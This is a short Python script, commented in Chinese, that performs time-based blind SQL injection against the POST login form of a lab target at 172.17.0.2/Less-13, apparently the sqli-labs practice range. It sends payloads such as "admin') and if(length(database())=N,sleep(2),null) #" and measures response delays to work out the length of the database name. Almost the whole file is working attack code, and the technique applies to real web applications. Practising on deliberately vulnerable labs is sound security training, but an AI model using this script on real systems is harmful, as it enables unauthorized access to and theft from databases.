import requests
import time

def send_payload(url, payload, headers=None):
    data = {
        "uname": payload,  
        "passwd": "123456",  
        "Submit": "Submit"
    }
    
    print("正在尝试注入")
    try:
        start = time.time()
        response = requests.post(url, data=data,timeout=10)
        duration = time.time() - start

        print(f"[+] 状态码: {response.status_code}")
        print(f"[+] 响应时长: {duration:.2f}s")
        return duration
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return None
def DBname():
    length  = 0
    print("正在获取数据库名称")
    for i in range(1,50):
       payload = f"admin') and if(length(database())={i},sleep(2),null) #"
       print(f"尝试{i}....")
       duration  = send_payload(url,payload,headers=headers)
       if duration  and duration > 2:
           print(f"数据库的长度为{i}")
           length  = i
           break
    
if __name__ == "__main__":
    session = requests.session()

    # 靶场地址（不要把 payload 放在 URL 里，因为这是 POST）
    url = 'http://172.17.0.2/Less-13/'  # 视实际而定

    # 请求头
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 时间盲注 payload 示例
    test_payload = "admin') and sleep(2) #"

   

    DBname()
    
